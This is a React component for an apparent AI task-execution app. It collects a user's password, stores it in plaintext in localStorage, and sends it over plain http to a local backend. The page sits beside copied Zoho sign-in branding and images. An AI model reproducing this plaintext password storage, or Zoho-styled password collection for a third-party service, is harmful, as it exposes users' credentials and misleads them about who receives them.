import React, { useState, useEffect } from "react";
import axios from "axios";
import "./TaskExecutor.css"; // Add styling for the component
import successImage from "../images/success.png";
import errorImage from "../images/error.png";
import loadingGif from "../images/loading.gif";
import { useNavigate } from "react-router-dom";
import "./styles.css";
import "./PaginationSlider.css";

const TaskExecutor = () => {
  const mobileNumber = localStorage.getItem("mobileNumber");
  const [password, setPassword] = useState("");
  const [status, setStatus] = useState("idle"); // 'idle', 'loading', 'success', or 'error'
  const [message, setMessage] = useState("");
  const navigate = useNavigate();
  const [showBanner, setShowBanner] = useState(true);
  const [selected, setSelected] = useState(0);
  useEffect(() => {
    const interval = setInterval(() => {
      setSelected((prev) => (prev + 1) % 2);
    }, 2000);

    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    const interval = setInterval(() => {
      setShowBanner((prev) => !prev);
    }, 2000); // Toggle every 2 seconds

    return () => clearInterval(interval); // Cleanup on unmount
  }, []);

  const handleTaskExecution = async () => {
    const email = localStorage.getItem("userEmail");
    
    if (!mobileNumber || !password || !email) {
      setMessage("All fields are required.");
      return;
    }
  
    setStatus("loading");
    setMessage("");
  
    try {
      localStorage.setItem("password", password);
      
      const response = await axios.post("http://localhost:5000/api/execute-task", {
        mobileNumber,
        password,
        email,
      });
  
      if (response.data.status === "success") {
        setStatus("success");
        setMessage("Task executed successfully! Details saved.");
      } else {
        setStatus("error");
        setMessage("Task execution failed.");
      }
    } catch (error) {
      setStatus("error");
      setMessage("An error occurred while executing the task.");
    }
  };

  return (
    <div className="center-div">
      <div className="task-executor-wrapper">
        {/* Main Task Execution Screens */}
        <div className="task-executor-container">
          {status === "idle" && (
            <div className="task-input-screen">
              <h2>Execute Task</h2>
              <p>Enter the details below to execute the task:</p>
              <input
                type="text"
                placeholder="Mobile Number"
                value={mobileNumber}
                className="input-field"
              />
              <input
                type="password"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="input-field"
              />
              <button onClick={handleTaskExecution} className="execute-button">
                Execute
              </button>
              {message && <p className="response-message">{message}</p>}
            </div>
          )}

          {status === "loading" && (
            <div className="loading-screen">
              <img
                src={loadingGif}
                alt="Loading"
                className="loading-gif"
                style={{
                  width: "175px",
                  height: "130px",
                  marginBottom: "20px",
                }}
              />
              <p>Please, wait while AI processes your task.</p>
              <p className="logout-link">
                Wish to <span onClick={() => navigate("/")}>Logout?</span>
              </p>
            </div>
          )}

          {status === "success" && (
            <div className="success-screen">
              <h2>Task Status</h2>
              <div className="success-icon">
                <img
                  src={successImage}
                  alt="Success"
                  style={{ width: "175px", height: "125px" }}
                />
              </div>
              <p>Great! Your task was executed successfully.</p>
              <button
                onClick={() => navigate("/dashboard")}
                className="next-button"
              >
                Next
              </button>
              <p className="logout-link">
                Wish to <span onClick={() => navigate("/")}>Logout?</span>
              </p>
            </div>
          )}

          {status === "error" && (
            <div className="error-screen">
              <h2>Task Status</h2>
              <div className="error-icon">
                <img
                  src={errorImage}
                  alt="Error"
                  style={{ width: "225px", height: "125px" }}
                />
              </div>
              <p>
                Oops, the task execution failed. Try again or contact support.
              </p>
              <button
                onClick={() => setStatus("idle")}
                className="try-again-button"
              >
                Try Again
              </button>
              <p className="logout-link">
                Wish to <span onClick={() => navigate("/")}>Logout?</span>
              </p>
            </div>
          )}
        </div>

        <div className="signin-right">
          {showBanner ? (
            <div className="overlapBanner">
              <div className="rightbanner">
                {/* <div className="container"> */}
                <div
                  className="banner1_img"
                  style={{
                    backgroundImage:
                      "url('https://static.zohocdn.com/iam/v2/components/images/Passwordless_illustration.5c0b2b6048ba19d2dec9f1fba38291c9.svg')",
                  }}
                ></div>
                <div className="banner1_heading">Passwordless sign-in</div>
                <div className="banner1_content">
                  Move away from risky passwords and experience one-tap access
                  to Zoho. Download and install OneAuth.
                </div>
                <div>
                  <a
                    className="banner2_href"
                    href="https://zoho.to/za_signin_oa_rp"
                    target="_blank"
                    rel="noreferrer"
                  >
                    Learn more
                  </a>
                </div>
                <div className="pagination-container">
                  <div
                    className={`pagination-dot ${
                      selected === 0 ? "selected" : ""
                    }`}
                  ></div>
                  <div
                    className={`pagination-dot ${
                      selected === 1 ? "selected" : ""
                    }`}
                  ></div>
                </div>
                {/* </div> */}
              </div>
            </div>
          ) : (
            <div className="mfa_panel">
              <div
                className="product_img"
                style={{
                  width: "300px",
                  height: "240px",
                  margin: "auto",
                  backgroundSize: "100%",
                  backgroundRepeat: "no-repeat",
                  backgroundImage:
                    "url('https://static.zohocdn.com/iam/v2/components/images/MFA_illustration.1afa6dddd07d21ad33a652ec63d146d6.svg')",
                }}
              ></div>
              <div className="banner1_heading">Keep your account secure</div>
              <div className="banner2_content">
                Zoho OneAuth is our new in-house multi-factor authentication
                app. Shield your Zoho account with OneAuth now.
              </div>
              <div>
                <a
                  className="banner2_href"
                  href="https://zoho.to/za_signin_oa_rp"
                  target="_blank"
                  rel="noreferrer"
                >
                  Learn more
                </a>
              </div>

              <div className="pagination-container">
                <div
                  className={`pagination-dot ${
                    selected === 0 ? "selected" : ""
                  }`}
                ></div>
                <div
                  className={`pagination-dot ${
                    selected === 1 ? "selected" : ""
                  }`}
                ></div>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default TaskExecutor;